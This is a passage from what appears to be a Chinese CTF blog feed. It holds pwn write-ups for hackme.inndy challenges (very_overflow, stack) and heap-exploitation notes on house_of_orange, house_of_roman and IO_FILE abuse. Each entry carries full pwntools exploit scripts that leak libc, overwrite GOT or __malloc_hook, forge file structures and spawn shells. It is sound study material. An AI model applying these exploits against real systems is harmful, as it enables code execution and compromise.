2.23 pwndbg top_chunk: 显示top chunk的信息 malloc_chunk address:打印出已被分配的chunk的信息 fastbins:显示fastbins链表信息 unsorted:显示unsortedbin 的信息 smallbins:显示smallbins的信息 largebins:显示largebins的信息 bins:显示所有bins的信息 mp：显示一些内存管理用到的全局变量 arena：显示分配区的信息]]></content>
      <categories>
        <category>TOOL</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[very_overflow writeup]]></title>
    <url>%2F2018%2F09%2F20%2F2018-9-22-very_overflow-writeup%2F</url>
    <content type="text"><![CDATA[防护机制： [*] &#39;/home/zs0zrc/pwn/Scoreboard/very_overflow/very_overflow&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 只开启了NX，并且程序是32位的。简单的运行了下，发现程序有4个功能。题目提供了源码就不用ida看了。这个程序模拟一个node的分配系统，但是没有用到堆，而是在栈上分配 node的结构体: struct NOTE { struct NOTE* next;//存储着下个note地址的指针 char data[128]; }; 程序的4个功能 1) add node 新建一个node 2) edit node 对给定下标的node进行编辑 3) show node 将给定下标的node的相关内容打印出来 4) dump nodes 将全部note的相关内容打印出来 这个程序主要 漏洞存在 add 和 edit 功能上 add一个新 node时，它设置node-&gt;next的操作有问题,单独看是没什么问题的。 node-&gt;next = (struct NOTE*)(node-&gt;data + strlen(node-&gt;data) + 1); edit用的是fgets函数，它读取的长度是固定的 fgets(node-&gt;data, sizeof(node-&gt;data), stdin);//这里 sizeof(node-data) = 128 // 如果创建的node的data大小比这个小，那么在edit时就会造成溢出，就可以修改下个node的next字段，达到任意地址读写的操作 具体思路： 利用edit的溢出修改下个node的next字段为got表的地址 通过show功能打印出libc内地址 在通过edit功能修改atoi函数在got表的内容为 system函数地址 然后发送 &#39;/bin/sh\x00&#39;字符串 就可以getshell了 exp: #!/usr/bin/env python from pwn import * local = 0 if local: p = process(&#39;./very_overflow&#39;) elf = ELF(&#39;./very_overflow&#39;) libc = elf.libc else: host = &#39;hackme.inndy.tw&#39; port = &#39;7705&#39; p = remote(host,port) elf = ELF(&#39;./very_overflow&#39;) libc = ELF(&#39;./libc-2.23.so.i386&#39;) context.arch = elf.arch context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] context.log_level=&#39;debug&#39; def sd(content): p.send(content) def sl(content): p.sendline(content) def rc(): return p.recv() def ru(content): return p.recvuntil(content) def debug(addr,PIE=False): if PIE: text_base = int(os.popen(&quot;pmap {}| awk &#39;{{print $1}}&#39;&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,&#39;b *{}&#39;.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr))) def add(content): ru(&quot;Your action:&quot;) sl(&#39;1&#39;) ru(&quot;note: &quot;) sd(content) def edit(idx,content): ru(&quot;Your action:&quot;) sl(&#39;2&#39;) ru(&quot; edit: &quot;) sl(str(idx)) ru(&quot;data: &quot;) sd(content) def show(idx): ru(&quot;Your action:&quot;) sl(&#39;3&#39;) ru(&#39;Which note to show: &#39;) sl(str(idx)) add(&#39;a&#39;*8+&#39;\n&#39;) add(&#39;b&#39;*8+&#39;\n&#39;) add(&#39;c&#39;*8+&#39;\n&#39;) edit(0,&#39;a&#39;*0xa + p32(elf.got[&#39;__libc_start_main&#39;])+&#39;\n&#39;) show(2) ru(&quot;Next note: &quot;) leak = int(p.recvline().strip(&#39;\n&#39;),16) print hex(leak) libc_base = leak - 0x18540 system = libc_base + libc.symbols[&#39;system&#39;] edit(2,p32(system)*3+&#39;\n&#39;) rc() sl(&quot;$0&quot;) sl(&#39;5&#39;) p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用来泄露libc的一些工具]]></title>
    <url>%2F2018%2F09%2F20%2F2018-9-20-leak_libc%2F</url>
    <content type="text"><![CDATA[libc_database ./add 用来添加libc库 ./add /usr/lib/libc-2.21.so ./find 用来查找libc版本 $ ./find printf 260 archive-glibc (id libc6_2.19-10ubuntu2_i386) ./dump 用来输出libc中的一些函数的偏移 $ ./dump libc6_2.19-0ubuntu6.6_i386 offset___libc_start_main_ret = 0x19a83 offset_system = 0x00040190 offset_dup2 = 0x000db590 offset_recv = 0x000ed2d0 offset_str_bin_sh = 0x160a24 LibcSearcher 一个基于libc_database写的python库例子 from LibcSearcher import * #第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型 obj = LibcSearcher(&quot;fgets&quot;, 0X7ff39014bd90) obj.dump(&quot;system&quot;) #system 偏移 obj.dump(&quot;str_bin_sh&quot;) #/bin/sh 偏移 obj.dump(&quot;__libc_start_main_ret&quot;) libc database search一个用来查询libc版本的网站 onegadget 一个神奇的工具 用来找libc中能一个gadget就get到shell的偏移 使用 one_gadget /lib/x86_64-linux-gnu/libc.so.6 info proc map 查看各个库加载信息然后寻找 “/bin/sh” 字符串strings: 查看文件中可见字符串strings -a -t x /lib32/libc.so.6 | grep “/bin/sh”objdump -d file | grep “ret” 可以用来查找ret指令objdump -x [filename] 打印头文件信息以及区段信息objdump -T libc.so | grep gets 我知道的就这么多了]]></content>
      <categories>
        <category>TOOL</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[stack writeup]]></title>
    <url>%2F2018%2F09%2F19%2F2018-9-19-stack-writeup%2F</url>
    <content type="text"><![CDATA[防护机制：全开 同时题目提供了一部分代码，通过阅读代码可以发现程序在模拟栈的PUSH和POP操作 void stack_push(struct stack *s, int val) { s-&gt;data[s-&gt;n++] = val; } int stack_pop(struct stack *s) { return s-&gt;data[--s-&gt;n]; } stack的结构体 struct stack { int n; int data[64]; }; 通过ida反编译后查看代码 int __cdecl stack_push(int *stack, int num) { int result; // eax result = *stack; *stack += &amp;(&amp;GLOBAL_OFFSET_TABLE_)[4294967042] + 1; stack[result + 1] = num; return result; } int __cdecl stack_pop(_DWORD *a1) { *a1 += &amp;unk_1FBF + 0xFFFFE040; return *(&amp;dword_1FC4[-2032] + &amp;a1[*a1]); } 不知道为什么我这反编译的东西看的这么奇怪，但是不管这个，程序没有对push或者pop的下标进行检查，所以可以先pop然后在push修改下标，就可以绕过canary，修改返回地址 push函数的汇编代码： .text:000006F0 stack_push proc near ; CODE XREF: main+DC↓p .text:000006F0 .text:000006F0 stack = dword ptr 8 .text:000006F0 num = dword ptr 0Ch .text:000006F0 .text:000006F0 ; __unwind { .text:000006F0 push ebp .text:000006F1 mov ebp, esp .text:000006F3 ; 4: result = *stack; .text:000006F3 call __x86_get_pc_thunk_ax .text:000006F8 add eax, 18C8h .text:000006FD mov eax, [ebp+stack]//n .text:00000700 mov eax, ds:(_GLOBAL_OFFSET_TABLE_ - 1FC0h)[eax] .text:00000702 ; 5: *stack += &amp;(&amp;GLOBAL_OFFSET_TABLE_)[4294967042] + 1; .text:00000702 lea ecx, (_GLOBAL_OFFSET_TABLE_+1 - 1FC0h)[eax] .text:00000705 mov edx, [ebp+stack] .text:00000708 mov [edx], ecx .text:0000070A ; 6: stack[result + 1] = num; .text:0000070A mov edx, [ebp+stack] //stack .text:0000070D mov ecx, [ebp+num] // number .text:00000710 mov [edx+eax*4+4], ecx 可以看到edx存放着stack结构体的地址，ecx存放着要进行操作的操作数，eax存放着要下标n pop函数汇编： =&gt; 0x56555717 &lt;+0&gt;: push ebp 0x56555718 &lt;+1&gt;: mov ebp,esp 0x5655571a &lt;+3&gt;: call 0x56555917 &lt;__x86.get_pc_thunk.ax&gt; 0x5655571f &lt;+8&gt;: add eax,0x18a1 0x56555724 &lt;+13&gt;: mov eax,DWORD PTR [ebp+0x8] 0x56555727 &lt;+16&gt;: mov eax,DWORD PTR [eax] 0x56555729 &lt;+18&gt;: lea edx,[eax-0x1] 0x5655572c &lt;+21&gt;: mov eax,DWORD PTR [ebp+0x8] 0x5655572f &lt;+24&gt;: mov DWORD PTR [eax],edx 0x56555731 &lt;+26&gt;: mov eax,DWORD PTR [ebp+0x8] 0x56555734 &lt;+29&gt;: mov edx,DWORD PTR [eax] \\ n 0x56555736 &lt;+31&gt;: mov eax,DWORD PTR [ebp+0x8] \\ stack 0x56555739 &lt;+34&gt;: mov eax,DWORD PTR [eax+edx*4+0x4] \\ stack-&gt;data[--n] 0x5655573d &lt;+38&gt;: pop ebp 0x5655573e &lt;+39&gt;: ret End of assembler dump. 观察栈的内容 pwndbg&gt; stack 98 00:0000│ esp 0xffffce4c — 0x56555820 (main+225) — 0x8b10c483 01:0004│ 0xffffce50 — 0xffffce68 — 0x0 02:0008│ 0xffffce54 — 0x4d2 03:000c│ 0xffffce58 — 0xf7ff5ac4 — jae 0xf7ff5b3f 04:0010│ 0xffffce5c — 0x5655575a (main+27) — 0x1866c381 05:0014│ 0xffffce60 — 0xf7ff39f3 — cmp al, 0x6d /* &#39;&lt;main program&gt;&#39; */ 06:0018│ 0xffffce64 — 0x4d2 07:001c│ eax 0xffffce68 — 0x0 ... ↓ 48:0120│ edi 0xffffcf6c — 0x69 /* &#39;i&#39; */ 49:0124│ 0xffffcf70 — 0x0 4a:0128│ 0xffffcf74 — 0xffffd245 — 0x6d6f682f (&#39;/hom&#39;) 4b:012c│ 0xffffcf78 — 0xf7fb6000 (_GLOBAL_OFFSET_TABLE_) — 0x1b1db0 4c:0130│ 0xffffcf7c — 0xaf17 4d:0134│ 0xffffcf80 — 0xffffd245 — 0x6d6f682f (&#39;/hom&#39;) 4e:0138│ 0xffffcf84 — 0x2f /* &#39;/&#39; */ 4f:013c│ 0xffffcf88 — 0x5e /* &#39;^&#39; */ 50:0140│ 0xffffcf8c — 0x16 51:0144│ 0xffffcf90 — 0x8000 52:0148│ 0xffffcf94 — 0xf7fb6000 (_GLOBAL_OFFSET_TABLE_) — 0x1b1db0 53:014c│ 0xffffcf98 — 0xf7fb4244 — 0xf7e1c020 (_IO_check_libio) — call 0xf7f23b59 54:0150│ 0xffffcf9c — 0xf7e1c0ec (init_cacheinfo+92) — test eax, eax 55:0154│ 0xffffcfa0 — 0x1 56:0158│ 0xffffcfa4 — 0x56556fc0 (_GLOBAL_OFFSET_TABLE_) — 0x1ee0 57:015c│ 0xffffcfa8 — 0x1 58:0160│ 0xffffcfac — 0xeb03c600 59:0164│ 0xffffcfb0 — 0x1 5a:0168│ 0xffffcfb4 — 0xffffd074 — 0xffffd245 — 0x6d6f682f (&#39;/hom&#39;) 5b:016c│ 0xffffcfb8 — 0xffffd07c — 0xffffd26d — 0x53554244 (&#39;DBUS&#39;) 5c:0170│ 0xffffcfbc — 0xffffcfe0 — 0x1 5d:0174│ 0xffffcfc0 — 0x0 5e:0178│ 0xffffcfc4 — 0xf7fb6000 (_GLOBAL_OFFSET_TABLE_) — 0x1b1db0 5f:017c│ ebp 0xffffcfc8 — 0x0 60:0180│ 0xffffcfcc — 0xf7e1c637 (__libc_start_main+247) — add esp, 0x10 61:0184│ 0xffffcfd0 — 0xf7fb6000 (_GLOBAL_OFFSET_TABLE_) — 0x1b1db0 返回地址存放着__libc_start_main + 247，可以通过这个泄露出libc地址，然后再覆盖返回地址为system函数地址，将对应参数写入栈中，这里写的地址要转换成int32的类型，不然会发生溢出 转换方法 ： func_addr = func_addr- (1&lt;&lt;32) or func_addr = func_addr - 0xffffffffff - 1 具体步骤： 1.先pop一次，然后push &#39;93&#39;修改n为0x5d,也就是main函数的返回地址的对应的下标 2.pop leak出libc的地址 3.将system函数写入返回地址中，并且将参数写入对应的位置 exp: #!/usr/bin/env python from pwn import * local = 1 if local: p = process(&#39;./stack&#39;) elf = ELF(&#39;./stack&#39;) libc = elf.libc else: host = &#39;hackme.inndy.tw&#39; port = &#39;7716&#39; p = remote(host,port) elf = ELF(&#39;./stack&#39;) libc = ELF(&#39;./libc-2.23.so.i386&#39;) context.arch = elf.arch context.log_level=&#39;debug&#39; def sd(content): p.send(content) def sl(content): p.sendline(content) def rc(): return p.recv() def ru(content): return p.recvuntil(content) def debug(addr,PIE=False): if PIE: text_base = int(os.popen(&quot;pmap {}| awk &#39;{{print $1}}&#39;&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,&#39;b *{}&#39;.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr))) def push(number): rc() sl(&#39;i&#39;) sl(str(number)) def pop(): rc() sl(&#39;p&#39;) pop() push(&#39;93&#39;) pop() ru(&quot;Pop -&gt; &quot;) leak = int(p.recv(10))&amp;0xffffffff print hex(leak) libc_base = leak - libc.symbols[&#39;__libc_start_main&#39;] - 247 print hex(libc_base) system = libc.symbols[&#39;system&#39;] + libc_base binsh = libc.search(&#39;/bin/sh\x00&#39;).next() + libc_base push(str(system-(1&lt;&lt;32))) push(&#39;0&#39;) push(str(binsh-(1&lt;&lt;32))) sl(&#39;x&#39;) p.interactive()]]></content>
      <categories>
        <category>hackme.inndy_writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[house_of_orange]]></title>
    <url>%2F2018%2F09%2F19%2F2018-9-19-house_of_orange%2F</url>
    <content type="text"><![CDATA[今天学习了下house_of_orange,总算是把house_of_orange给搞懂了 house_of_orange原理其实很简单，就是利用unsorted bin attack 和_IO_FILE利用的结合 这里涉及到的知识点有点多，是堆利用和IO_FILE利用的结合，所以要对两者都有一定的了解 直接拿house_of_orange这道经典的题来说吧 防护机制： 基本程序逻辑：一共有三个功能 build 创建一个house 输入housename的长度、内容、price、color的一些信息，并且它的将house更新为最新分配的house，所以我们只能对刚分配的house进行操作 upgrade 更新house的内容，这里读取name时存在堆溢出漏洞 see 打印出house的信息 ，这里可以将地址leak出来 大致思路： 通过堆溢出，修改top chunk的大小，然后分配一个大小大于top chunk大小的chunk，所以 旧top chunk就会被free掉，进入unsorted bin中，然后再分配一个大小在large bin 的大小范围内的chunk，那么这个chunk就会包含libc的地址和它本身的地址，通过两次upgrade和see将libc地址和heap地址都泄露出来。之后通过堆溢出修改old top chunk的size字段为0x60，利用unsorted bin attack将 _IO_list_all修改为main_arena+0x58，同时old top chunk会被链入small bin中，如果再分配一个chunk，就会触发malloc_printerr，会遍历IO_llist_all，最终调用 IO_overflow函数，具体的下面会展开 首先这个题没有free功能，所以要想办法可以生成一个unsorted bins的chunk，这里是通过堆溢出，修改top chunk的大小，使它变小，这里要注意top chunk的size是有一些检查的，然后分配一个大小超出top chunk大小的chunk，这时根据申请的大小，会通过sysmalloc 来分配，如果申请的大小小于mmap的阀值的话，就会扩展top chunk，将old top chunk free掉，如果大于的话，就会通过mmap申请一块新的堆块。 sysmalloc源码： if (av == NULL || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))/*这里进行判断，判断分配的大小是否大于mmap分配的阀值，如果大于就是用mmap从新分配一个堆块，否则就会扩展top chunk*/ { char *mm; /* return value from mmap call*/ try_mmap: ......... .......... if (old_size != 0) { /* Shrink old_top to insert fenceposts, keeping size a multiple of MALLOC_ALIGNMENT. We know there is at least enough space in old_top to do this. */ old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK; set_head (old_top, old_size | PREV_INUSE); set_head (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE); set_head (chunk_at_offset (old_top, old_size + 2 * SIZE_SZ), (2 * SIZE_SZ) | PREV_INUSE); /* If possible, release the rest. */ if (old_size &gt;= MINSIZE) { _int_free (av, old_top, 1);/*将old top chunk free掉，加入unsorted bin*/ } } ...........省略了挺多的 具体可以自己去看源码 能产生unsorted bin 之后，就要想着怎么泄露出libc地址了，libc地址很好泄露，但是heap的地址也要泄露出来，用于后面伪造_IO_FILE_plus结构体。这里的做法是，通过申请一个large bin大小的chunk，那么它的fd_nextsize和bk_nextsize中会存放自身的地址，通过这就可以泄露出堆地址 具体做法是，是使用upgrade功能，将name依次更新为‘aaaaaaaa’及’a’*16 然后通过see功能就可以将地址打印出来 build(0x400,&#39;a&#39;*8,123,1) see() p.recvuntil(&quot;a&quot;*8) leak = u64(p.recv(6).ljust(8,&#39;\x00&#39;)) libc_base = leak -1640- 0x3c4b20 print &quot;libc base address --&gt;[%s]&quot;%hex(libc_base) upgrade(0x400,&#39;a&#39;*16,123,1) see() p.recvuntil(&#39;a&#39;*16) leak_heap = u64(p.recv(6).ljust(8,&#39;\x00&#39;)) heap_base = leak_heap - 0xe0 print &quot;leak_heap --&gt;[%s]&quot;%hex(leak_heap) print &quot;heap_base --&gt;[%s]&quot;%hex(heap_base) _IO_list_all = libc.symbols[&#39;_IO_list_all&#39;] + libc_base system = libc.symbols[&#39;system&#39;] + libc_base 利用unsoted bin attack将 _IO_list_all 修改为 main_arena+88 这个很容易就实现，之后再分配一个chunk时会触发malloc_printerr if (__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (chunksize_nomask (victim) &gt; av-&gt;system_mem, 0)) malloc_printerr (&quot;malloc(): memory corruption&quot;); 触发malloc_printerr后会调用一系列函数，最终调用 _IO_overflow函数 函数大致调用链 malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW 而_IO_OVERFLOW最后会调用vtable表中的__overflow 函数 #define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH) _IO_flush_all_lockp 源码： _IO_flush_all_lockp (int do_lock) { int result = 0; FILE *fp; #ifdef _IO_MTSAFE_IO _IO_cleanup_region_start_noarg (flush_cleanup); _IO_lock_lock (list_all_lock); #endif for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain) { run_fp = fp; if (do_lock) _IO_flockfile (fp); if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)/*一些检查，需要绕过*/ || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))/*也可以绕过这个*/ ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/ result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; } #ifdef _IO_MTSAFE_IO _IO_lock_unlock (list_all_lock); _IO_cleanup_region_end (0); #endif return result; } 所以这里通过将_IO_list_all修改为main_arena+0x58,这时IO_list_all中的 *chain指针位于 _IO_list_all + 0x68的位置，也就是 main_arena + 0x58 + 0x68–&gt;small bin中大小为0x60的位置，所以将之前old top chunk的size修改为0x60，old top chunk就会链入small bin中，这时就可以将伪造的fake_file链入IO_all_list中,将fake_file的vtable指向伪造的IO_jump_t结构的地址，在伪造的 IO_jump_t 结构体中，在overflow函数处写入system函数，则最终会调用system函数 伪造的file结构体要通过的条件 1.((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) 或者是 2. _IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base) 一般来说上面比较好伪造，我下面的exp也是伪造的上面的 如果伪造下面的话还要关注一下_wide_data结构体，这里就略过了 查看是否为伪造成功 此时的vtable已经指向伪造的函数表了 exp： from pwn import* context.log_level = &#39;debug&#39; p = process(&#39;./houseoforange&#39;) elf = ELF(&#39;./houseoforange&#39;) libc = elf.libc def menu(idx): p.recvuntil(&#39;: &#39;) p.sendline(str(idx)) def see(): menu(2) def build(length, nm, pz, color): menu(1) p.recvuntil(&quot;:&quot;) p.sendline(str(length)) p.recvuntil(&quot;:&quot;) p.send(nm) p.recvuntil(&quot;:&quot;) p.sendline(str(pz)) p.recvuntil(&quot;:&quot;) p.sendline(str(color)) def upgrade(length, nm, pz, color): menu(3) p.recvuntil(&quot;:&quot;) p.sendline(str(length)) p.recvuntil(&quot;:&quot;) p.send(nm) p.recvuntil(&quot;:&quot;) p.sendline(str(pz)) p.recvuntil(&quot;:&quot;) p.sendline(str(color)) build(0x30,&#39;a&#39;*8,123,1) #gdb.attach(p) payload = &#39;a&#39;*0x30 + p64(0) + p64(0x21) +&#39;a&#39;*16+ p64(0)+ p64(0xf80) upgrade(len(payload),payload,123,2) build(0x1000,&#39;b&#39;,123,1) log.info(&#39;-----------------------leak address-------------------------&#39;) build(0x400,&#39;a&#39;*8,123,1) see() p.recvuntil(&quot;a&quot;*8) leak = u64(p.recv(6).ljust(8,&#39;\x00&#39;)) libc_base = leak -1640- 0x3c4b20 print &quot;libc base address --&gt;[%s]&quot;%hex(libc_base) upgrade(0x400,&#39;a&#39;*16,123,1) see() p.recvuntil(&#39;a&#39;*16) leak_heap = u64(p.recv(6).ljust(8,&#39;\x00&#39;)) heap_base = leak_heap - 0xe0 print &quot;leak_heap --&gt;[%s]&quot;%hex(leak_heap) print &quot;heap_base --&gt;[%s]&quot;%hex(heap_base) _IO_list_all = libc.symbols[&#39;_IO_list_all&#39;] + libc_base system = libc.symbols[&#39;system&#39;] + libc_base log.info(&#39;-------------------------unsorted bin and build fake file--------------------------&#39;) payload = &#39;a&#39;*0x400 payload += p64(0) + p64(0x21) + &#39;a&#39;*0x10 fake_file = &#39;/bin/sh\x00&#39; + p64(0x60) #这里写入binsh字符串是因为最后调用vtable中的函数时会将IO_FILE的指针作为参数 fake_file += p64(0) + p64(_IO_list_all - 0x10)#unsorted bin attack fake_file += p64(0) + p64(1) #bypass check fake_file = fake_file.ljust(0xc0,&#39;\x00&#39;) payload += fake_file payload += p64(0)*3 payload += p64(heap_base + 0x5e8)#vtable payload += p64(0)*2 payload += p64(system) upgrade(0x800,payload,123,1) p.recv() p.sendline(&#39;1&#39;) p.interactive()]]></content>
      <categories>
        <category>Heap_Exploitation</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>houseofxxx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[house_of_roman]]></title>
    <url>%2F2018%2F09%2F18%2F2018-9-18-house_of_roman%2F</url>
    <content type="text"><![CDATA[记录一下，防止以后忘了 house_of_roman：该技术用于 bypass ALSR，利用12-bit 的爆破来达到获取shell的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用 house_of_roman的作者提供了一个demo作为展示利用大概分三个步骤： 将 FD 指向 malloc_hook 修正 0x71 的 Freelist 往 malloc_hook 写入 one gadget 先分析下程序：程序开启了PIE和NX，一共有3个功能 程序存在UAF漏洞和堆溢出漏洞 堆溢出： UAF： 程序的大致情况了解了后，分析作者的利用过程我将作者的利用过程又细分了下 先分配3个chunk(0,1,2),大小分别为0x20,0xd0,0x70 用write_chunk功能在chunk2 + 0x68上设置fakesize 为0x61，用于后面的fastbins attack 将chunk1 free 掉后再分配，使得chunk1中包含main_arean+0x88的指针 然后分配3个大小为0x70的chunk(3,4,5),为后面做准备 通过堆溢出漏洞，将chunk1的size字段伪造为0x71，然后将chunk2,chunk3 free掉，通过UAF漏洞，将chunk3的fd指针最低位修改成0x20，将chunk1加入fastbins list中 将chunk1的fd修改成 malloc_hook-0x23,之所以修改成malloc_hook-0x23 ，是为了后面的fastbin dup， __malloc_hook - 0x23 + 0x8的地址上的值为0x7f 连续分配3个大小为0x70的chunk，就可以获得包含__malloc_hook的chunk，将这个chunk指针赋给chunk0 free掉chunk4,通过uaf，将chunk4的FD修改为0，修复fastbins list 利用unsorted bins attack 向__malloc_hook写入main_arena+0x88 通过编辑功能，将__malloc_hook的低三个字节修改成one_gadget的偏移 最后连续free chunk5两次，通过malloc_printerr来出发malloc，getshell 为了方便调试，我关掉了aslr 设置fake_sizefake = &quot;A&quot;*0x68 fake += p64(0x61) ## fake size edit(1,fake) free chunk1，使其包含main_arena+0x88的地址 *分配3个大小为0x70的chunk,修改chunk1的size字段为0x71 create(0x65,3) # chunk3 0x555555757170 create(0x65,15) # chunk4 0x5555557571e0 create(0x65,18) # chunk5 0x555555757250 over = &quot;A&quot;*0x18 # off by one over += &quot;\x71&quot; # set chunk 1&#39;s size --&gt; 0x71 edit(0,over) free掉chunk2，chunk3，通过uaf将chunk3的fd最低为修改为’\x20’，将chunk1加入fastbins list中delete(2) delete(3) heap_po = &quot;\x20&quot; edit(3,heap_po) 利用write功能，将chunk1的fd指针最低两位修改成’\xed\x1a’,即将fd修改为malloc_hook - 0x23，这是为了利用fastbins dup 获得包含malloc_hook的chunk， 原因上面说了，因为__malloc_hook - 0x23 +0x8地址的值为0x7f，可以绕过检测 malloc_hook_nearly = &quot;\xed\x1a&quot; #__malloc_hook - 0x23 edit(1,malloc_hook_nearly) 连续分配三次大小为0x70的chunk，就可以获得包含__malloc_hook的chunk了 利用 unsorted bin attack 向malloc_hook中写入main_arena+0x88，使malloc_hook中包含libc的地址 create(0xc8,1) create(0xc8,1) create(0x18,2) create(0xc8,3) create(0xc8,4) delete(1) po = &quot;B&quot;*8 po += &quot;\x00\x1b&quot; # 这个是__memalign_hook的最低两位，为了将bk修改为__malloc_hook - 0x10 edit(1,po) create(0xc8,1) 通过修改chunk0，将__malloc_hook的低三位修改为one_gadget over = &quot;R&quot;*0x13 # padding for malloc_hook over += &quot;\xa4\xd2\xaf&quot; edit(0,over) 此时 malloc_hook附近的内容为下图，padding的计算是分配包含malloc_hook的chunk的地址 减去 __malloc_hook的地址 最后通过连续free同一块chunk，通过malloc_printerr 来触发malloc getshell exp: from pwn import* #context.log_level = &#39;debug&#39; p = process(&#39;./new_chall&#39;) def create(size,idx): p.recv() p.sendline(&#39;1&#39;) p.recv() p.sendline(str(size)) p.recv() p.sendline(str(idx)) def edit(idx,content): p.recv() p.sendline(&#39;2&#39;) p.recv() p.sendline(str(idx)) p.recv() p.send(content) def delete(idx): p.recv() p.sendline(&#39;3&#39;) p.recv() p.sendline(str(idx)) p.recvuntil(&quot;:&quot;) p.sendline(&quot;zs0zrc&quot;) create(0x18,0) # chunk0 0x20 create(0xc8,1) # chunk1 d0 0x555555757030 create(0x65,2) # chunk2 0x70 0x555555757100 fake = &quot;A&quot;*0x68 fake += p64(0x61) ## fake size edit(1,fake) log.info(&#39;edit chunk 1 to fake&#39;) delete(1) create(0xc8,1) create(0x65,3) # chunk3 0x555555757170 create(0x65,15) # chunk4 0x5555557571e0 create(0x65,18) # chunk5 0x555555757250 over = &quot;A&quot;*0x18 # off by one over += &quot;\x71&quot; # set chunk 1&#39;s size --&gt; 0x71 edit(0,over) log.info(&#39;set chunk 1 size --&gt; 0x71&#39;) delete(2) delete(3) heap_po = &quot;\x20&quot; edit(3,heap_po) log.info(&#39;ADD b to fastbins list&#39;) # malloc_hook--&gt;[0x7ffff7dd1b10] malloc_hook_nearly = &quot;\xed\x1a&quot; #__malloc_hook - 0x23 edit(1,malloc_hook_nearly) log.info(&quot;change B fd &quot;) create(0x65,0) create(0x65,0) create(0x65,0) #malloc a chunk include malloc_hook delete(15) edit(15,p64(0))#fix fastbins list log.info(&#39;fix fastbins list&#39;) create(0xc8,1) create(0xc8,1) create(0x18,2) create(0xc8,3) create(0xc8,4) delete(1) po = &quot;B&quot;*8 po += &quot;\x00\x1b&quot; edit(1,po) create(0xc8,1) log.info(&#39;use unsortbins attack change malloc_hook to main_arena + 0x88&#39;) over = &quot;R&quot;*0x13 # padding for malloc_hook over += &quot;\xa4\xd2\xaf&quot; edit(0,over) delete(18) delete(18) p.interactive()]]></content>
      <categories>
        <category>Heap_Exploitation</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>houseofxxx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IO_FILE的利用总结]]></title>
    <url>%2F2018%2F09%2F17%2F2018-9-17-IO_FILE%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[fclose 劫持fp指针,伪造_IO_FILE_plus结构 伪造IO_FILE_plus结构体, 32位和64位不一样，32位的需要伪造vtable,而64位可以不用伪造vtable，因为64位的在绕过几个函数后会获得一次call [rax + 0x10]的机会 先说32bits的 调用 IO_FINISH(fp)的情况 #注意flags字段，只需要_flags &amp; 0x2000为0就会直接调用 IO_FINSH(fp)，IO_FINISH(fp)相当于调用fp-&gt;vtabl-&gt;__finish(fp) #其中shell是后门函数 fake_file = &quot;\x00&quot; * 0x48 + p32(buf_add) fake_file = fake_file.ljust(0x94, &quot;\x00&quot;) fake_file += p32(buf_add + 0x98 - 0x8)#fake_vtable_addr = buf_addr + 0x98 - 0x8 fake_file += p32(shell) #不存在后门函数的情况 fake_file = &quot;\x00&quot; * 4 + &quot;;sh&quot; fake_file = fake_file.ljust(0x48,&#39;\x00&#39;)+ p32(buf_add) fake_file = fake_file.ljust(0x94, &quot;\x00&quot;) fake_file += p32(buf_add + 0x98 - 0x8)#fake_vtable_addr = buf_addr + 0x98 - 0x8 fake_file += p32(system) 调用__fclose()函数的情况: flags &amp; 0x2000不为0 #_flags &amp; 0x2000不为0最终会调用fp-&gt;vtabl-&gt;__fclose(fp) fake_file = &quot;/bin/sh\x00&quot; fake_file = fake_file.ljust(0x48,&#39;\x00&#39;) fake_file += p32(fake_lock_addr) # 指向一处值为0的地址 fake_file = fake_file.ljust(0x94, &quot;\x00&quot;) fake_file += p32(fake_vtable)#fake vtable address = buf_addr + 0x98 - 0x44 fake_file += p32(system) 64bits的情况： 